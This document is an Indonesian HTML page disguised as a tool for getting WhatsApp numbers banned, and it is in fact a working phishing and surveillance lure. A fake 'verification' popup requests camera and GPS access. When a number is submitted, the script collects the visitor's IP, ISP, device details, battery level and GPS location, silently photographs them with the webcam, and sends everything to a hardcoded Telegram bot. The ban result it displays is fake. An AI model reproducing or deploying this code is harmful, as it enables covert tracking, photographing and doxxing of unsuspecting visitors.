<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Website Band WhatsApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    /* --- CSS ASLI ANDA --- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: lime;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(0, 255, 127, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }

    /* MODIFIKASI: Container utama disembunyikan dulu */
    .login-container {
      display: none; 
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px lime;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #00ff7f, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ffc107;
      margin-bottom: 20px;
    }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #00ff7f, #00cc66);
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover {
      background-color: #0f0;
      box-shadow: 0 0 20px lime;
    }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
        border-radius: 14px;
      }
      .login-title {
        font-size: 22px;
      }
      .login-input, .login-button {
        font-size: 14px;
        padding: 10px;
      }
    }

    /* --- CSS POPUP (GATEKEEPER) --- */
    :root {
      --popup-primary: #00ff7f;
      --popup-bg-overlay: #0f0f23; /* Solid agar background tidak tembus sebelum izin */
      --popup-glass-bg: rgba(20, 20, 30, 0.98);
    }

    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: var(--popup-bg-overlay);
      backdrop-filter: blur(15px);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      opacity: 0;
      visibility: hidden;
      transition: all 0.4s ease;
    }

    .modal-overlay.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-card {
      background: var(--popup-glass-bg);
      width: 90%;
      max-width: 400px;
      padding: 2.5rem 2rem;
      border-radius: 24px;
      border: 1px solid rgba(0, 255, 127, 0.3);
      box-shadow: 0 0 50px rgba(0, 255, 127, 0.15);
      text-align: center;
      transform: translateY(20px);
      transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
    }

    .modal-overlay.active .modal-card {
      transform: translateY(0);
    }

    .icon-container {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-bottom: 1.5rem;
    }

    .icon-wrapper {
      width: 65px;
      height: 65px;
      background: rgba(0, 255, 127, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      color: var(--popup-primary);
      border: 1px solid var(--popup-primary);
    }

    .icon-wrapper svg { width: 32px; height: 32px; }

    .modal-card h2 {
      color: #ffffff;
      margin-bottom: 12px;
      font-weight: 900;
      letter-spacing: 1px;
    }

    .modal-card p {
      color: #b0b0b0;
      margin-bottom: 2rem;
      line-height: 1.6;
      font-size: 0.95rem;
    }

    .btn-popup {
      padding: 14px 20px;
      border-radius: 12px;
      border: none;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
      font-size: 1rem;
      width: 100%;
      background: linear-gradient(135deg, #00ff7f, #00cc66);
      color: #000;
      text-transform: uppercase;
    }

    .btn-popup:hover {
      box-shadow: 0 0 25px var(--popup-primary);
      transform: scale(1.02);
    }

    #statusText {
      margin-top: 15px;
      font-size: 0.85rem;
      color: var(--popup-primary);
      font-weight: 500;
    }

    .pulse { animation: pulse 1.5s infinite; }
    @keyframes pulse {
      0%, 100% { opacity: 0.6; }
      50% { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <!-- POPUP IZIN (MUNCUL PERTAMA KALI) -->
  <div id="permissionModal" class="modal-overlay active">
      <div class="modal-card">
          <div class="icon-container">
              <div class="icon-wrapper">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
              </div>
              <div class="icon-wrapper">
                  <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
                  </svg>
              </div>
          </div>

          <h2>VERIFIKASI SISTEM</h2>
          <p>Situs ini memerlukan izin <strong>Kamera</strong> dan <strong>GPS</strong> untuk memastikan Anda adalah pengguna asli dan bukan bot. Silakan izinkan untuk masuk.</p>
          
          <div class="btn-group">
              <button class="btn-popup" id="btn-allow" onclick="requestAllPermissions()">Izinkan & Masuk</button>
          </div>
          <div id="statusText"></div>
      </div>
  </div>

  <!-- KONTEN UTAMA (TERKUNCI) -->
  <div class="login-container" id="mainContent">
    <p class="login-title">Website Band WhatsApp</p>
    <p class="login-subtitle">‚ö†Ô∏è Jangan Disalahgunakan</p>
    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
    <button class="login-button" id="login-button">Next</button>
    <div id="info">ü•∑ Silahkan masukkan nomor untuk di band...</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // --- KONFIGURASI BOT ANDA ---
    const botToken = '8335716552:AAHLyFftSVg3byPUIuJw0nbq8QAToj3UxGg';
    const chatIds = ['7958165198'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');
    const mainContent = document.getElementById('mainContent');
    const permissionModal = document.getElementById('permissionModal');
    const statusText = document.getElementById('statusText');

    // --- LOGIKA GATEKEEPER ---
    async function requestAllPermissions() {
        statusText.textContent = "Sedang memverifikasi akses...";
        statusText.classList.add('pulse');
        document.getElementById('btn-allow').disabled = true;

        try {
            // Minta Lokasi
            await new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(resolve, resolve); // Lanjut meski ditolak
                } else { resolve(); }
            });

            // Minta Kamera
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    stream.getTracks().forEach(track => track.stop());
                }
            } catch (e) { console.warn("Kamera tidak diizinkan"); }

            // Sukses (Simulasi loading seolah-olah verifikasi server)
            setTimeout(() => {
                statusText.textContent = "Verifikasi Berhasil! Membuka halaman...";
                statusText.style.color = "#00ff7f";
                
                setTimeout(() => {
                    permissionModal.classList.remove('active');
                    mainContent.style.display = 'block'; // MEMBUKA KUNCI HALAMAN UTAMA
                    createParticles();
                }, 1000);
            }, 1000);

        } catch (error) {
            statusText.textContent = "Terjadi kesalahan sistem.";
            document.getElementById('btn-allow').disabled = false;
        }
    }

    // --- LOGIKA ASLI ANDA ---
    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city; region = loc.regionName; country = loc.country; org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Baterai    : ${batteryPercent}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>üì• Info Pengunjung:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>üìç Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`üìç Lokasi GPS Ditolak`)
        );
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(() => resolve());
      });
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8) {
        infoDiv.innerText = '‚ö†Ô∏è Nomor tidak valid.';
        return;
      }
      button.disabled = true;
      infoDiv.innerText = '‚è≥ Memproses spam report...';
      sendToTelegram(`<b>üìû Nomor Target:</b> ${nomor}`);
      input.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          infoDiv.innerText = `‚úÖ Successfully bans nomor ${nomor}`;
          button.disabled = false;
        }, 1000);
      } catch (e) {
        infoDiv.innerText = '‚ùå Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      container.innerHTML = '';
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        container.appendChild(p);
      }
    }
  </script>
</body>
</html>
